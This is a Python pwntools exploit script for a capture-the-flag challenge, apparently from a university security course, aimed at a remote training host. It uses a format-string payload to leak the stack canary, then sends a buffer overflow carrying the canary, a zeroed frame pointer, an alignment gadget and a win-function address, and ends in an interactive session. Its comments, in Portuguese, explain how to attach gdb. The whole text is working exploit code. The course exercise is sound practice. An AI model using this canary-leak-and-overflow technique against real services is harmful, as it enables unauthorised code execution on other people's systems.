from pwn import *
import re

LOCAL = False

if LOCAL:
    p = process("./formatted_canary")
    """
    O pause() para este script e permite-te usar o gdb para dar attach ao processo
    Para dar attach ao processo tens de obter o pid do processo a partir do output deste programa. 
    (Exemplo: Starting local process './program': pid 9717 - O pid seria  9717) 
    Depois correr o gdb de forma a dar attach. 
    (Exemplo: `$ gdb attach 9717` )
    Ao dar attach ao processo com o gdb, o programa para na instrução onde estava a correr.
    Para continuar a execução do programa deves no gdb  enviar o comando "continue" e dar enter no script da exploit.
    """
    pause()
else:    
    p = remote("ctf-fsi.fe.up.pt", 7003)

# Win function address
win = bytearray.fromhex('000000000040077d')
win.reverse()

# Get Canary
p.recvuntil(b"Exit")

p.sendline(b"1")
p.recvuntil(b":")

p.sendline(b"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%13$p")

p.recvuntil(b"Exit")
p.sendline(b"2")

rec = p.recvuntil(b"Exit").decode()
canaryText = re.search('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa0x(.+?)\n', rec).group(1)
canary = bytearray.fromhex(canaryText)
canary.reverse()

# Get Frame Pointer

p.sendline(b"1")
p.recvuntil(b":")

p.sendline(b"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%14$p")

p.recvuntil(b"Exit")
p.sendline(b"2")
rec = p.recvuntil(b"Exit").decode()

fp = bytearray.fromhex("0"*16)
fp.reverse()


# Fill the buffer
fillBuffer = b"a" * 40

ret = bytearray.fromhex("000000000040097c");
ret.reverse();

p.sendline(b"1")

p.send(fillBuffer)
p.send(canary)
p.send(fp)
p.send(ret) # align the stack
p.sendline(win)

# Exit to win()
p.recvuntil(b"Exit")
p.sendline(b"3")

p.interactive()
# b *0x400851
# b *0x400786
